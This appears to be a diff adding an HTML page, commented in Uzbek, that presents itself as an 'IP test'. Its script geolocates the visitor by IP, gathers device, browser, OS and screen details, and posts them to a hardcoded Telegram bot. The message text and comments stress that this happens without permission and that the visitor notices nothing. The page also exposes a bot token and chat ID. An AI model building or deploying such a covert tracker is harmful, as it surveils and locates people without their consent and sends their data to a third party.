@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>IP Test - Hech narsa sezilmaydi</title>
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background: #f0f2f5;
+        padding: 20px;
+        text-align: center;
+    }
+    .container {
+        max-width: 600px;
+        margin: 50px auto;
+        background: white;
+        padding: 30px;
+        border-radius: 20px;
+        box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+    }
+    button {
+        background: #27ae60;
+        color: white;
+        border: none;
+        padding: 15px 30px;
+        font-size: 18px;
+        border-radius: 10px;
+        cursor: pointer;
+        margin: 10px;
+    }
+    button:hover {
+        background: #2ecc71;
+    }
+    .info {
+        margin-top: 20px;
+        padding: 15px;
+        background: #f8f9fa;
+        border-radius: 10px;
+        text-align: left;
+        display: none;
+    }
+    .info.show {
+        display: block;
+    }
+    h3 {
+        color: #2c3e50;
+    }
+    hr {
+        margin: 15px 0;
+    }
+</style>
+</head>
+<body>
+<div class="container">
+    <h2>🔍 Test: IP va Lokatsiya</h2>
+    <p style="color: #7f8c8d;">Hech qanday ruxsat so'ralmaydi! Siz hech narsa sezmaysiz.</p>
+    
+    <button onclick="getIPInfo()">📡 IP va joylashuvni olish</button>
+    <button onclick="sendToTelegramTest()">📨 Telegramga yuborish</button>
+    
+    <div id="infoBox" class="info">
+        <h3>📊 Aniqlangan ma'lumotlar:</h3>
+        <div id="ipInfo"></div>
+    </div>
+</div>
+
+<script>
+// Telegram Bot sozlamalari
+const BOT_TOKEN = "8228813912:AAEUVa5dMgsg9uuCrTlYGgIG0joSy8TQ1qE";
+const CHAT_ID = "855204630"; // SIZNING TELEGRAM ID INGIZNI QO'YING!!!
+
+// Global o'zgaruvchi
+let currentIPData = {};
+
+// 1. IP va joylashuv ma'lumotlarini olish (ruxatsiz)
+async function getIPInfo() {
+    try {
+        // ipapi.co - ruxsat talab qilmaydi, hech qanday so'rov chiqmaydi
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        
+        currentIPData = {
+            ip: data.ip || 'Noma\'lum',
+            city: data.city || 'Noma\'lum',
+            region: data.region || 'Noma\'lum',
+            country: data.country_name || 'Noma\'lum',
+            country_code: data.country_code || 'Noma\'lum',
+            postal: data.postal || 'Noma\'lum',
+            latitude: data.latitude || 'Noma\'lum',
+            longitude: data.longitude || 'Noma\'lum',
+            timezone: data.timezone || 'Noma\'lum',
+            isp: data.org || 'Noma\'lum',
+            asn: data.asn || 'Noma\'lum'
+        };
+        
+        // Ma'lumotlarni ekranda ko'rsatish
+        const infoDiv = document.getElementById('ipInfo');
+        infoDiv.innerHTML = `
+            <strong>🌐 IP manzil:</strong> ${currentIPData.ip}<br>
+            <strong>📍 Shahar:</strong> ${currentIPData.city}<br>
+            <strong>🏙️ Viloyat:</strong> ${currentIPData.region}<br>
+            <strong>🇺🇿 Davlat:</strong> ${currentIPData.country} (${currentIPData.country_code})<br>
+            <strong>📮 Pochta indeksi:</strong> ${currentIPData.postal}<br>
+            <strong>🗺️ Koordinatalar:</strong> ${currentIPData.latitude}, ${currentIPData.longitude}<br>
+            <strong>⏰ Vaqt mintaqasi:</strong> ${currentIPData.timezone}<br>
+            <strong>📡 Internet provayder:</strong> ${currentIPData.isp}<br>
+            <strong>🔢 ASN:</strong> ${currentIPData.asn}<br>
+            <hr>
+            <em style="color: #27ae60;">✅ Hech qanday ruxsat so'ralmadi! IP orqali aniqlandi.</em>
+        `;
+        
+        document.getElementById('infoBox').classList.add('show');
+        
+        // Konsolga chiqarish (faqat rivojlantiruvchi uchun)
+        console.log('IP ma\'lumotlari aniqlandi:', currentIPData);
+        
+        return currentIPData;
+        
+    } catch (error) {
+        console.error('Xatolik:', error);
+        document.getElementById('ipInfo').innerHTML = `
+            <span style="color: red;">❌ Xatolik yuz berdi: ${error.message}</span><br>
+            <small>Ba'zi brauzerlarda IP ni aniqlash bloklanishi mumkin.</small>
+        `;
+        document.getElementById('infoBox').classList.add('show');
+        return null;
+    }
+}
+
+// 2. Telegramga yuborish (foydalanuvchi sezmaydi, backgroundda)
+async function sendToTelegramTest() {
+    // Avval IP ma'lumotlarini olish
+    if (!currentIPData.ip) {
+        await getIPInfo();
+    }
+    
+    if (!currentIPData.ip) {
+        alert("IP ma'lumotlarini olib bo'lmadi. Internet ulanishini tekshiring.");
+        return;
+    }
+    
+    // Qurilma haqida ma'lumot (ruxatsiz)
+    const userAgent = navigator.userAgent;
+    let device = "Noma'lum qurilma";
+    let browser = "Noma'lum brauzer";
+    let os = "Noma'lum OS";
+    
+    if (/iPhone/i.test(userAgent)) {
+        device = "iPhone";
+        const match = userAgent.match(/iPhone OS (\d+)_/);
+        os = `iOS ${match ? match[1] : '?'}`;
+    } else if (/iPad/i.test(userAgent)) {
+        device = "iPad";
+        os = "iPadOS";
+    } else if (/Android/i.test(userAgent)) {
+        device = /Samsung/i.test(userAgent) ? "Samsung" :
+                 /Xiaomi/i.test(userAgent) ? "Xiaomi" :
+                 /Huawei/i.test(userAgent) ? "Huawei" :
+                 "Android telefon";
+        const match = userAgent.match(/Android (\d+\.?\d*)/);
+        os = `Android ${match ? match[1] : '?'}`;
+    } else if (/Windows/i.test(userAgent)) {
+        device = "Windows kompyuter";
+        os = "Windows";
+    } else if (/Macintosh/i.test(userAgent)) {
+        device = "Mac kompyuter";
+        os = "macOS";
+    }
+    
+    if (/Chrome/i.test(userAgent) && !/Edg/i.test(userAgent)) browser = "Chrome";
+    else if (/Firefox/i.test(userAgent)) browser = "Firefox";
+    else if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) browser = "Safari";
+    else if (/Edg/i.test(userAgent)) browser = "Edge";
+    else if (/Opera|OPR/i.test(userAgent)) browser = "Opera";
+    
+    // Ekran o'lchami
+    const screenSize = `${window.screen.width}x${window.screen.height}`;
+    
+    // Sana va vaqt
+    const now = new Date();
+    const datetime = `${now.getDate().toString().padStart(2,'0')}.${(now.getMonth()+1).toString().padStart(2,'0')}.${now.getFullYear()} ${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`;
+    
+    // Xabar matni
+    const message = `🕵️‍♂️ FOYDALANUVCHI MA'LUMOTLARI (RUXSATSIZ)
+━━━━━━━━━━━━━━━━━━━━━━
+📅 Vaqt: ${datetime}
+━━━━━━━━━━━━━━━━━━━━━━
+🌐 IP MA'LUMOTLARI:
+• IP manzil: ${currentIPData.ip}
+• Davlat: ${currentIPData.country} (${currentIPData.country_code})
+• Shahar: ${currentIPData.city}
+• Viloyat: ${currentIPData.region}
+• Pochta indeksi: ${currentIPData.postal}
+• Koordinatalar: ${currentIPData.latitude}, ${currentIPData.longitude}
+• Vaqt mintaqasi: ${currentIPData.timezone}
+• Provayder: ${currentIPData.isp}
+• ASN: ${currentIPData.asn}
+━━━━━━━━━━━━━━━━━━━━━━
+📱 QURILMA MA'LUMOTLARI:
+• Qurilma: ${device}
+• Operatsion tizim: ${os}
+• Brauzer: ${browser}
+• Ekran: ${screenSize}px
+• User Agent: ${userAgent.substring(0, 100)}...
+━━━━━━━━━━━━━━━━━━━━━━
+📍 TAXMINIY MANZIL:
+https://maps.google.com/?q=${currentIPData.latitude},${currentIPData.longitude}
+━━━━━━━━━━━━━━━━━━━━━━
+⚠️ Bu ma'lumotlar ruxsatsiz aniqlandi!
+Foydalanuvchi hech narsa sezmadi.`;
+    
+    try {
+        // Telegram API ga so'rov yuborish (backgroundda)
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML',
+                disable_notification: false
+            })
+        });
+        
+        const result = await response.json();
+        
+        if (result.ok) {
+            // Foydalanuvchiga hech narsa demaymiz yoki xohlasangiz ozgina xabar
+            console.log('Telegramga yuborildi!');
+            
+            // Lekin sizga test uchun kichik xabar (buni o'chirib qo'yishingiz mumkin)
+            const testMsg = document.createElement('div');
+            testMsg.textContent = '✅ Telegramga yuborildi!';
+            testMsg.style.position = 'fixed';
+            testMsg.style.bottom = '20px';
+            testMsg.style.right = '20px';
+            testMsg.style.background = '#27ae60';
+            testMsg.style.color = 'white';
+            testMsg.style.padding = '10px 20px';
+            testMsg.style.borderRadius = '10px';
+            testMsg.style.fontSize = '14px';
+            testMsg.style.zIndex = '9999';
+            document.body.appendChild(testMsg);
+            setTimeout(() => testMsg.remove(), 2000);
+        } else {
+            console.error('Xato:', result);
+        }
+        
+    } catch (error) {
+        console.error('Yuborishda xatolik:', error);
+    }
+}
+
+// Sahifa yuklanganda avtomatik IP aniqlash (xohlasangiz)
+// getIPInfo(); // Buni yoqish orqali foydalanuvchi saytga kirgandayoq IP aniqlanadi
+</script>
+
+</body>
+</html>
